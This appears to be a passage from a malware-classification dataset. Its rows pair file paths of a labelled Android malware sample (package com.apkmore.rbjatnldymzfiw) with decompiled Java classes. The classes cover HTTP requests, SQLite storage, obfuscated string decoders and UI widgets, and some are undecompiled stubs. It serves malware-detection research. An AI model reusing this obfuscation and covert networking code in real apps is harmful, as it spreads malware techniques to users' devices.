{             th=th2;             if (bufferedReader != null) {               try {                 bufferedReader.close();               }  catch (              IOException e4) {                 e4.printStackTrace();               }             }             if (inputStream != null) {               try {                 inputStream.close();               }  catch (              IOException e5) {                 e5.printStackTrace();               }             }             throw th;           }         }         str=sb.toString();         if (bufferedReader != null) {           try {             bufferedReader.close();           }  catch (          IOException e6) {             e6.printStackTrace();           }         }         if (inputStream != null) {           try {             inputStream.close();           }  catch (          IOException e7) {             e7.printStackTrace();           }         }       }  catch (      Exception e8) {         bufferedReader=null;       } catch (      Throwable th3) {         bufferedReader=null;         th=th3;       }     }     return str;   }   private String a(  HashMap hashMap){     String str=f135a[ay.o(this.c)];     if (hashMap == null) {       return str;     }     StringBuffer stringBuffer=null;     for (    String str2 : hashMap.keySet()) {       String str3=(String)hashMap.get(str2);       if (stringBuffer == null) {         stringBuffer=new StringBuffer();         stringBuffer.append(""?"");       }  else {         stringBuffer.append(""&"");       }       stringBuffer.append(str2);       stringBuffer.append(""="");       stringBuffer.append(str3);     }     return str + stringBuffer.toString();   }   private byte[] a(){     JSONObject jSONObject=new JSONObject();     try {       jSONObject.put(this.d.b(),this.d.a());       return jSONObject.toString().getBytes();     }  catch (    JSONException e) {       e.printStackTrace();       return null;     }   }   public ag a(  String str){     String a2;     HashMap hashMap=new HashMap();     hashMap.put(h.P,""1"");     String a3=a(hashMap);     this.d.r=str;     InputStream a4=a(a3,a());     if (a4 == null || (a2=a(a4)) == null) {       return null;     }     return (ag)al.a(ag.class,a2);   }   public HashMap a(  String str,  String str2){     String a2;     HashMap hashMap=new HashMap();     hashMap.put(h.P,""0"");     String a3=a(hashMap);     this.d.r=str2;     this.d.t=str;     InputStream a4=a(a3,a());     if (a4 == null || (a2=a(a4)) == null) {       return null;     }     HashMap hashMap2=new HashMap();     ag agVar=(ag)al.a(ag.class,a2);     ad[] adVarArr=(ad[])al.b(ad.class,a2);     if (adVarArr != null) {     }     hashMap2.put(ag.class.getName(),agVar);     hashMap2.put(ad.class.getName(),adVarArr);     return hashMap2;   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.j\y.code","final class y extends Handler {   final Wi f136a;   public y(  Wi wi,  Looper looper){     super(looper);     this.f136a=wi;   }   @Override public void handleMessage(  android.os.Message r10){     throw new UnsupportedOperationException(""Method not decompiled: com.apkmore.rbjatnldymzfiw.j.y.handleMessage(android.os.Message):void"");   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.j\z.code","public final class z implements com.apkmore.rbjatnldymzfiw.j.b.c {   final Context f137a;   final at b;   public z(  Context context,  at atVar){     this.f137a=context;     this.b=atVar;   }   @Override public void a(  com.apkmore.rbjatnldymzfiw.j.b.h hVar,  int i){     if (i == 4) {       Hnu.b(this.f137a,hVar.c().getPath(),this.b);     }   }   @Override public void a(  com.apkmore.rbjatnldymzfiw.j.b.h hVar,  long j){   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.j.a\a.code","public class a extends Gallery {   private Bitmap f76a;   private Bitmap b;   private int c;   public a(  Context context){     super(context,null);     this.c=-2;     setAdapter((SpinnerAdapter)new b(this));   }   public a(  Context context,  int i){     super(context,null);     this.c=-2;     this.c=i;     setAdapter((SpinnerAdapter)new b(this));   }   private int a(){     return this.f76a.getHeight();   }   private void a(  Canvas canvas){     int count=getAdapter().getCount();     if (count <= 0 || this.f76a == null || this.b == null) {       return;     }     int width=this.f76a.getWidth();     int a2=a();     int selectedItemPosition=getSelectedItemPosition();     int width2=((getWidth() - (width * count)) - ((count - 1) * 10)) / 2;     int height=(getHeight() - a2) - 10;     for (int i=0; i < count; i++) {       if (i != selectedItemPosition) {         canvas.drawBitmap(this.f76a,width2,height,(Paint)null);       }  else {         canvas.drawBitmap(this.b,width2,height,(Paint)null);       }       width2+=width + 10;     }   }   private boolean a(  MotionEvent motionEvent,  MotionEvent motionEvent2){     return motionEvent2.getX() > motionEvent.getX();   }   public void a(  Bitmap bitmap,  int i){     try {       b bVar=(b)getAdapter();       bVar.a().set(i,bitmap);       bVar.notifyDataSetChanged();     }  catch (    Exception e) {       e.printStackTrace();     }   }   public void a(  Bitmap bitmap,  Bitmap bitmap2){     if (bitmap == null || bitmap2 == null) {       return;     }     this.f76a=bitmap;     this.b=bitmap2;     this.f76a.setDensity(240);     this.b.setDensity(240);   }   public void a(  List list){     ((b)getAdapter()).a(list);   }   @Override public void draw(  Canvas canvas){     super.draw(canvas);     a(canvas);   }   @Override public boolean onFling(  MotionEvent motionEvent,  MotionEvent motionEvent2,  float f,  float f2){     onKeyDown(a(motionEvent,motionEvent2) ? 21 : 22,null);     return true;   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.j.a\b.code","public class b extends BaseAdapter {   final a f77a;   private List b=new ArrayList();   public b(  a aVar){     this.f77a=aVar;   }   public List a(){     return this.b;   }   public void a(  List list){     this.b=list;     notifyDataSetChanged();   }   @Override public int getCount(){     return this.b.size();   }   @Override public Object getItem(  int i){     return this.b.get(i);   }   @Override public long getItemId(  int i){     return i;   }   @Override public View getView(  int i,  View view,  ViewGroup viewGroup){     View view2;     int i2;     int i3;     if (view == null) {       ImageView imageView=new ImageView(this.f77a.getContext());       imageView.setAdjustViewBounds(true);       imageView.setScaleType(ImageView.ScaleType.FIT_CENTER);       i2=this.f77a.c;       i3=this.f77a.c;       imageView.setLayoutParams(new Gallery.LayoutParams(i2,i3));       view2=imageView;     }  else {       view2=view;     }     Drawable a2=com.apkmore.rbjatnldymzfiw.j.d.a.a(this.f77a.getContext(),(Bitmap)this.b.get(i));     if (a2 != null) {       ((ImageView)view2).setImageDrawable(a2);     }     return view2;   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.j.a\c.code","public class c extends GridView {   public c(  Context context){     super(context);   }   @Override public void onMeasure(  int i,  int i2){     super.onMeasure(i,View.MeasureSpec.makeMeasureSpec(536870911,ExploreByTouchHelper.INVALID_ID));   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.j.b\a.code","public class a {   public void a(  String str,  String str2,  Handler handler,  Message message){     new Thread(new b(this,str,str2,handler,message)).start();   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.j.b\b.code","public class b implements Runnable {   final String f98a;   final String b;   final Handler c;   final Message d;   final a e;   public b(  a aVar,  String str,  String str2,  Handler handler,  Message message){     this.e=aVar;     this.f98a=str;     this.b=str2;     this.c=handler;     this.d=message;   }   @Override public void run(){     try {       ay.c(this.f98a,this.b);       this.c.sendMessage(this.d);     }  catch (    IOException e) {       e.printStackTrace();     }   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.j.b\c.code","public interface c {   void a(  h hVar,  int i);   void a(  h hVar,  long j); } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.j.b\d.code","!org.eclipse.jdt.core.dom.TypeDeclaration@555773ac"
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.j.b\e.code","class e {   public static final String f100a=com.apkmore.rbjatnldymzfiw.j.h.F;   public static final String b=com.apkmore.rbjatnldymzfiw.j.h.G;   public static final String c=com.apkmore.rbjatnldymzfiw.j.h.H;   public static final String d=com.apkmore.rbjatnldymzfiw.j.h.I;   public static final String e=com.apkmore.rbjatnldymzfiw.j.h.J;   public static final String f=com.apkmore.rbjatnldymzfiw.j.h.K;   public static final String g=com.apkmore.rbjatnldymzfiw.j.h.L;   public static final String h=com.apkmore.rbjatnldymzfiw.j.h.M;   public static final String i=com.apkmore.rbjatnldymzfiw.j.h.N;   public static final String j=com.apkmore.rbjatnldymzfiw.j.h.O;   public String k;   public String l;   public int m;   public int n=-1;   public int o;   public String p;   public String q;   public int r;   public String s;   public String toString(){     return ""["" + this.k + "" ""+ this.l+ "" ""+ this.o+ "" ""+ this.m+ "" ""+ this.n+ ""  ""+ this.p+ ""  ""+ this.q+ "" ""+ this.s+ ""]"";   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.j.b\f.code","class f {   private static final String f101a=com.apkmore.rbjatnldymzfiw.j.h.p;   private static final String b=com.apkmore.rbjatnldymzfiw.j.h.p;   private g c;   public f(  Context context){     this.c=new g(context);   }   public List a(){     ArrayList arrayList=new ArrayList();     SQLiteDatabase readableDatabase=this.c.getReadableDatabase();     Cursor query=readableDatabase.query(b,null,com.apkmore.rbjatnldymzfiw.j.h.bc,new String[]{""4""},null,null,null);     while (query.moveToNext()) {       e eVar=new e();       eVar.k=query.getString(query.getColumnIndex(e.b));       eVar.l=query.getString(query.getColumnIndex(e.c));       eVar.m=query.getInt(query.getColumnIndex(e.d));       eVar.n=query.getInt(query.getColumnIndex(e.e));       eVar.o=query.getInt(query.getColumnIndex(e.f));       eVar.p=query.getString(query.getColumnIndex(e.h));       eVar.q=query.getString(query.getColumnIndex(e.g));       eVar.r=query.getInt(query.getColumnIndex(e.i));       eVar.s=query.getString(query.getColumnIndex(e.j));       arrayList.add(eVar);     }     query.close();     readableDatabase.close();     return arrayList;   }   public synchronized void a(  e eVar){     SQLiteDatabase writableDatabase=this.c.getWritableDatabase();     ContentValues contentValues=new ContentValues();     contentValues.put(e.b,eVar.k);     contentValues.put(e.c,eVar.l);     contentValues.put(e.d,Integer.valueOf(eVar.m));     contentValues.put(e.e,Integer.valueOf(eVar.n));     contentValues.put(e.f,Integer.valueOf(eVar.o));     contentValues.put(e.h,eVar.p);     contentValues.put(e.g,eVar.q);     contentValues.put(e.i,Integer.valueOf(eVar.r));     contentValues.put(e.j,eVar.s);     writableDatabase.insert(b,null,contentValues);     writableDatabase.close();   }   public void b(  e eVar){     SQLiteDatabase writableDatabase=this.c.getWritableDatabase();     writableDatabase.delete(b,com.apkmore.rbjatnldymzfiw.j.h.bd,new String[]{eVar.k,eVar.l});     writableDatabase.close();   }   public synchronized void c(  e eVar){     SQLiteDatabase writableDatabase=this.c.getWritableDatabase();     ContentValues contentValues=new ContentValues();     contentValues.put(e.b,eVar.k);     contentValues.put(e.c,eVar.l);     contentValues.put(e.d,Integer.valueOf(eVar.m));     contentValues.put(e.e,Integer.valueOf(eVar.n));     contentValues.put(e.f,Integer.valueOf(eVar.o));     contentValues.put(e.h,eVar.p);     contentValues.put(e.g,eVar.q);     contentValues.put(e.i,Integer.valueOf(eVar.r));     contentValues.put(e.j,eVar.s);     writableDatabase.update(b,contentValues,com.apkmore.rbjatnldymzfiw.j.h.bd,new String[]{eVar.k,eVar.l});     writableDatabase.close();   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.j.b\g.code","public class g extends SQLiteOpenHelper {   public g(  android.content.Context r4){     throw new UnsupportedOperationException(""Method not decompiled: com.apkmore.rbjatnldymzfiw.j.b.g.<init>(android.content.Context):void"");   }   @Override public void onCreate(  SQLiteDatabase sQLiteDatabase){     String str;     StringBuilder append=new StringBuilder().append(com.apkmore.rbjatnldymzfiw.j.h.bf).append("" "");     str=f.b;     sQLiteDatabase.execSQL(append.append(str).append("" "").append(""("").append(e.f100a).append("" "").append(com.apkmore.rbjatnldymzfiw.j.h.bh).append("" "").append(com.apkmore.rbjatnldymzfiw.j.h.bi).append("","").append(e.b).append("" "").append(com.apkmore.rbjatnldymzfiw.j.h.bj).append("","").append(e.c).append("" "").append(com.apkmore.rbjatnldymzfiw.j.h.bj).append("","").append(e.d).append("" "").append(com.apkmore.rbjatnldymzfiw.j.h.bh).append("","").append(e.e).append("" "").append(com.apkmore.rbjatnldymzfiw.j.h.bh).append("","").append(e.f).append("" "").append(com.apkmore.rbjatnldymzfiw.j.h.bh).append("","").append(e.h).append("" "").append(com.apkmore.rbjatnldymzfiw.j.h.bj).append("","").append(e.g).append("" "").append(com.apkmore.rbjatnldymzfiw.j.h.bj).append("","").append(e.i).append("" "").append(com.apkmore.rbjatnldymzfiw.j.h.bh).append("","").append(e.j).append("" "").append(com.apkmore.rbjatnldymzfiw.j.h.bj).append("" "").append("")"").append("";"").toString());   }   @Override public void onUpgrade(  SQLiteDatabase sQLiteDatabase,  int i,  int i2){     String str;     StringBuilder append=new StringBuilder().append(com.apkmore.rbjatnldymzfiw.j.h.bg).append("" "");     str=f.b;     sQLiteDatabase.execSQL(append.append(str).toString());     onCreate(sQLiteDatabase);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.j.b\h.code","!org.eclipse.jdt.core.dom.TypeDeclaration@ec9efc4"
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.j.c\a.code","public class a extends e {   private HttpClient b;   public a(  Context context,  h hVar){     super(context,hVar);   }   public void a(  HttpPost httpPost,  HttpEntity httpEntity){     httpPost.setEntity(httpEntity);   }   @Override public boolean a(){     HttpRequestBase httpRequestBase;     if (c()) {       if (!l()) {         a(-4);         return false;       }       a((Exception)null);       a(-2);       this.b=new DefaultHttpClient();       float j=j();       if (j > 0.0f) {         this.b.getParams().setParameter(""http.socket.timeout"",Integer.valueOf((int)(j * 1000.0f)));         this.b.getParams().setParameter(""http.connection.timeout"",Integer.valueOf((int)(j * 1000.0f)));       }       g k=k();       if (k != null) {         this.b.getParams().setParameter(""http.route.default-proxy"",new HttpHost(k.a(),k.b(),""http""));       }       h d=d();       if (d.b() == 0) {         httpRequestBase=new HttpGet(d.toString());       }  else {         HttpPost httpPost=new HttpPost(d.c());         try {           a(httpPost,new StringEntity(d.d()));         }  catch (        UnsupportedEncodingException e) {           e.printStackTrace();         }         httpRequestBase=httpPost;       }       for (      Map.Entry entry : d.a().entrySet()) {         httpRequestBase.addHeader(entry.getKey().toString(),entry.getValue().toString());       }       try {         HttpResponse execute=this.b.execute(httpRequestBase);         int statusCode=execute.getStatusLine().getStatusCode();         HashMap hashMap=new HashMap();         for (        Header header : execute.getAllHeaders()) {           hashMap.put(header.getName(),header.getValue());         }         a(hashMap);         a(execute.getEntity().getContent());         if (("""" + statusCode).startsWith(""2"")) {           a(200);           return true;         }       }  catch (      Exception e2) {         a(e2);         a(-3);       }     }     return false;   }   @Override public void b(){     if (c()) {       return;     }     if (this.b != null) {       this.b.getConnectionManager().shutdown();     }     a((Map)null);     a((InputStream)null);     a((Exception)null);     a(-3);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.j.c\b.code","public class b {   private boolean f104a=false;   private List b=new ArrayList();   public b(){     a(1);   }   private c a(){     c cVar=null;     for (    c cVar2 : this.b) {       cVar2.a();       if (cVar != null && cVar2.size() >= cVar.size()) {         cVar2=cVar;       }       cVar=cVar2;     }     return cVar;   }   public boolean b(  e eVar){     return eVar.a();   }   public void a(  int i){     if (this.b.size() < i) {       int size=i - this.b.size();       for (int i2=0; i2 < size; i2++) {         this.b.add(new c(this));       }     }   }   public void a(  e eVar){     eVar.a(-1);     if (this.f104a) {       b(eVar);       return;     }     c a2=a();     if (a2 != null) {       a2.add(eVar);     }   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.j.c\c.code","public class c extends ConcurrentLinkedQueue {   final b f105a;   private Thread b;   private int c=(int)(Math.random() * 131072.0d);   public c(  b bVar){     this.f105a=bVar;   }   public void a(){     Iterator it=iterator();     while (it.hasNext()) {       if (((e)it.next()).h() == -3) {         it.remove();       }     }   }   @Override public boolean add(  e eVar){     boolean add=super.add(eVar);     if (add && this.b == null) {       this.b=new d(this);       this.b.start();     }     return add;   }   @Override public String toString(){     return """" + this.c;   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.j.c\d.code","public class d extends Thread {   final c f106a;   public d(  c cVar){     this.f106a=cVar;   }   @Override public void run(){     int i;     int i2=0;     while (true) {       e eVar=(e)this.f106a.peek();       if (eVar == null) {         this.f106a.b=null;         return;       }       if ((eVar.h() == -1 ? this.f106a.f105a.b(eVar) : false) || i2 > 1) {         this.f106a.poll();         i=0;       }  else {         i=i2 + 1;       }       i2=i;     }   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.j.c\e.code","!org.eclipse.jdt.core.dom.TypeDeclaration@49592df9"
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.j.c\f.code","public interface f {   void a(  e eVar,  int i); } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.j.c\g.code","public class g {   private String f108a;   private int b;   public g(  String str,  int i){     this.f108a=str;     this.b=i;   }   public String a(){     return this.f108a;   }   public int b(){     return this.b;   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.j.c\h.code","public class h {   private String f109a;   private Map c;   private boolean e;   private int d=0;   private Map b=new LinkedHashMap();   public h(  String str){     this.f109a=str;   }   public synchronized Map a(){     Map map;     if (this.c == null) {       this.c=new LinkedHashMap();       map=this.c;     }  else {       map=this.c;     }     return map;   }   public synchronized void a(  String str,  Object obj){     if (this.c == null) {       this.c=new LinkedHashMap();       this.c.put(str,obj);     }  else {       this.c.put(str,obj);     }   }   public int b(){     return this.d;   }   public String c(){     return this.f109a;   }   public String d(){     if (this.b.isEmpty()) {       return """";     }     ArrayList arrayList=new ArrayList();     for (    String str : this.b.keySet()) {       Object obj=this.b.get(str);       if (obj != null) {         arrayList.add(new BasicNameValuePair(str,obj.toString()));       }     }     String format=URLEncodedUtils.format(arrayList,com.apkmore.rbjatnldymzfiw.j.h.aZ);     return this.e ? com.apkmore.rbjatnldymzfiw.j.d.f.a(format) : format;   }   public String toString(){     String d=d();     return d.equals("""") ? this.f109a : this.f109a + ""?"" + d;   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.j.d\a.code","public class a {   private static int d;   private static int f111a=0;   private static Map b=new HashMap();   private static Map c=new HashMap();   private static Map e=new HashMap();   private static final int[] f={0,2911,3935,4980,5800,6955,12202,17545,21034,28807,41610,42040,45264,48179,54261,60483};   public static Bitmap a(  Context context,  int i){     Bitmap b2;     if ((!b.containsKey(Integer.valueOf(i)) || (b2=(Bitmap)((SoftReference)b.get(Integer.valueOf(i))).get()) == null) && (b2=b(context,i)) != null) {       b.put(Integer.valueOf(i),new SoftReference(b2));     }     return b2;   }   public static Drawable a(  Context context,  Bitmap bitmap){     if (d == 0) {       DisplayMetrics displayMetrics=new DisplayMetrics();       ((WindowManager)context.getSystemService(""window"")).getDefaultDisplay().getMetrics(displayMetrics);       d=displayMetrics.densityDpi;     }     BitmapDrawable bitmapDrawable=new BitmapDrawable(bitmap);     a(bitmapDrawable);     return bitmapDrawable;   }   private static void a(  BitmapDrawable bitmapDrawable){     bitmapDrawable.setTargetDensity((int)(d * ((d * 1.0f) / 240.0f)));   }   public static android.graphics.Bitmap b(  android.content.Context r8,  int r9){     throw new UnsupportedOperationException(""Method not decompiled: com.apkmore.rbjatnldymzfiw.j.d.a.b(android.content.Context, int):android.graphics.Bitmap"");   }   public static Drawable c(  Context context,  int i){     Drawable drawable;     if (c.containsKey(Integer.valueOf(i)) && (drawable=(Drawable)((SoftReference)c.get(Integer.valueOf(i))).get()) != null) {       return drawable;     }     Bitmap b2=b(context,i);     if (b2 == null) {       return null;     }     Drawable a2=a(context,b2);     if (a2 == null) {       return a2;     }     c.put(Integer.valueOf(i),new SoftReference(a2));     return a2;   }   public static NinePatchDrawable d(  Context context,  int i){     try {       Bitmap a2=a(context,i);       byte[] ninePatchChunk=a2.getNinePatchChunk();       if (!NinePatch.isNinePatchChunk(ninePatchChunk)) {         return null;       }       Rect rect=new Rect();       NinePatchDrawable ninePatchDrawable=new NinePatchDrawable(a2,ninePatchChunk,d.a(ninePatchChunk).f114a,null);       ninePatchDrawable.getPadding(rect);       if (d == 0) {         DisplayMetrics displayMetrics=new DisplayMetrics();         ((WindowManager)context.getSystemService(""window"")).getDefaultDisplay().getMetrics(displayMetrics);         d=displayMetrics.densityDpi;       }       ninePatchDrawable.setTargetDensity((int)(d * ((d * 1.0f) / 240.0f)));       return ninePatchDrawable;     }  catch (    Exception e2) {       e2.printStackTrace();       return null;     }   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.j.d\b.code","public class b {   public static String f112a=h.q; } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.j.d\c.code","public class c {   private static int[] f113a={131,117,129,120,146,133,TransportMediator.KEYCODE_MEDIA_PAUSE,139,124,134,142,TransportMediator.KEYCODE_MEDIA_PLAY,149,119,Emulator.GAMEPAD_UP_RIGHT,125,159,140,132,TransportMediator.KEYCODE_MEDIA_PLAY,143,118,111,146,142,121,143,TransportMediator.KEYCODE_MEDIA_RECORD,119,114,131,138};   public static String a(  String str){     if (str == null || !str.startsWith(""x"") || !str.endsWith(""y"")) {       return """";     }     StringBuilder sb=new StringBuilder(str);     sb.deleteCharAt(0);     sb.deleteCharAt(sb.length() - 1);     char[] charArray=sb.toString().toCharArray();     StringBuilder sb2=new StringBuilder();     for (int i=0; i < charArray.length; i++) {       try {         a(sb2,(char)(charArray[i] - f113a[(charArray.length + i) % f113a.length]));       }  catch (      Exception e) {         e.printStackTrace();       }     }     return sb2.toString();   }   private static void a(  StringBuilder sb,  char c){     sb.append(c);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.j.d\d.code","public class d {   public Rect f114a=new Rect();   public int[] b;   public int[] c;   public int[] d;   public static d a(  byte[] bArr){     ByteBuffer order=ByteBuffer.wrap(bArr).order(ByteOrder.nativeOrder());     if (order.get() == 0) {       return null;     }     d dVar=new d();     dVar.b=new int[order.get()];     dVar.c=new int[order.get()];     dVar.d=new int[order.get()];     a(dVar.b.length);     a(dVar.c.length);     order.getInt();     order.getInt();     dVar.f114a.left=order.getInt();     dVar.f114a.right=order.getInt();     dVar.f114a.top=order.getInt();     dVar.f114a.bottom=order.getInt();     order.getInt();     a(dVar.b,order);     a(dVar.c,order);     a(dVar.d,order);     return dVar;   }   private static void a(  int i){     if (i == 0 || (i & 1) != 0) {       throw new RuntimeException(h.cT + "":"" + i);     }   }   private static void a(  int[] iArr,  ByteBuffer byteBuffer){     int length=iArr.length;     for (int i=0; i < length; i++) {       iArr[i]=byteBuffer.getInt();     }   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.j.d\e.code","public class e {   private static Map f115a=new HashMap();   private static Map b=new HashMap();   private static int c;   public static Bitmap a(  Context context,  String str){     Bitmap b2;     if ((!f115a.containsKey(str) || (b2=(Bitmap)((SoftReference)f115a.get(str)).get()) == null) && (b2=b(context,str)) != null) {       f115a.put(str,new SoftReference(b2));     }     return b2;   }   public static Drawable a(  Context context,  Bitmap bitmap){     if (c == 0) {       DisplayMetrics displayMetrics=new DisplayMetrics();       ((WindowManager)context.getSystemService(""window"")).getDefaultDisplay().getMetrics(displayMetrics);       c=displayMetrics.densityDpi;     }     BitmapDrawable bitmapDrawable=new BitmapDrawable(bitmap);     a(bitmapDrawable);     return bitmapDrawable;   }   private static void a(  BitmapDrawable bitmapDrawable){     bitmapDrawable.setTargetDensity((int)(c * ((c * 1.0f) / 240.0f)));   }   public static android.graphics.Bitmap b(  android.content.Context r4,  java.lang.String r5){     throw new UnsupportedOperationException(""Method not decompiled: com.apkmore.rbjatnldymzfiw.j.d.e.b(android.content.Context, java.lang.String):android.graphics.Bitmap"");   }   public static Drawable c(  Context context,  String str){     Drawable drawable;     if (b.containsKey(str) && (drawable=(Drawable)((SoftReference)b.get(str)).get()) != null) {       return drawable;     }     Bitmap b2=b(context,str);     if (b2 == null) {       return null;     }     Drawable a2=a(context,b2);     if (a2 == null) {       return a2;     }     b.put(str,new SoftReference(a2));     return a2;   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.j.d\f.code","public class f {   private static final String f116a=h.o;   private static final Pattern b=Pattern.compile(h.bb);   public static String a(  String str){     byte[] bytes=str.getBytes();     byte[] bytes2=f116a.getBytes();     StringBuilder sb=new StringBuilder();     for (int i=0; i < bytes.length; i++) {       sb.append(""%"" + (bytes[i] + bytes2[i % bytes2.length]));     }     return sb.toString();   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.v\a.code","public class a implements Runnable {   final View f141a;   final Sc b;   public a(  Sc sc,  View view){     this.b=sc;     this.f141a=view;   }   @Override public void run(){     Stack stack;     Stack stack2;     Stack stack3;     TranslateAnimation translateAnimation;     Stack stack4;     TranslateAnimation translateAnimation2;     stack=this.b.f;     if (stack.size() > 0) {       stack4=this.b.f;       View view=(View)stack4.peek();       view.clearFocus();       translateAnimation2=this.b.g;       view.startAnimation(translateAnimation2);     }     stack2=this.b.f;     stack2.push(this.f141a);     this.b.c=this.f141a;     this.b.setContentView(this.f141a);     this.f141a.requestFocus();     stack3=this.b.f;     if (stack3.size() > 1) {       View view2=this.f141a;       translateAnimation=this.b.h;       view2.startAnimation(translateAnimation);     }   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.v\aa.code","public interface aa {   void a(); } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.v\ab.code","public class ab implements Runnable {   final Zh f147a;   public ab(  Zh zh){     this.f147a=zh;   }   @Override public void run(){     Context context;     y a2=y.a();     context=this.f147a.f140a;     a2.a(context,true);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.v\ac.code","final class ac extends Handler {   final Zh f148a;   public ac(  Zh zh,  Looper looper){     super(looper);     this.f148a=zh;   }   @Override public void handleMessage(  Message message){     PowerManager powerManager;     boolean z;     ac acVar;     powerManager=this.f148a.f;     if (powerManager.isScreenOn()) {       this.f148a.a();     }     z=this.f148a.e;     if (z) {       acVar=this.f148a.c;       acVar.sendEmptyMessageDelayed(0,1000L);     }   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.v\b.code","class b implements AdapterView.OnItemClickListener {   final Sc f149a;   public b(  Sc sc){     this.f149a=sc;   }   @Override public void onItemClick(  AdapterView adapterView,  View view,  int i,  long j){     AdapterView.OnItemClickListener onItemClickListener;     com.apkmore.rbjatnldymzfiw.v.b.f fVar=(com.apkmore.rbjatnldymzfiw.v.b.f)adapterView.getAdapter().getItem(i);     this.f149a.b=new o(this.f149a,fVar);     o oVar=this.f149a.b;     onItemClickListener=this.f149a.k;     oVar.a(onItemClickListener);     this.f149a.a(this.f149a.b.f203a);     com.apkmore.rbjatnldymzfiw.v.b.a.a().a(this.f149a,fVar.e,0);   } } "
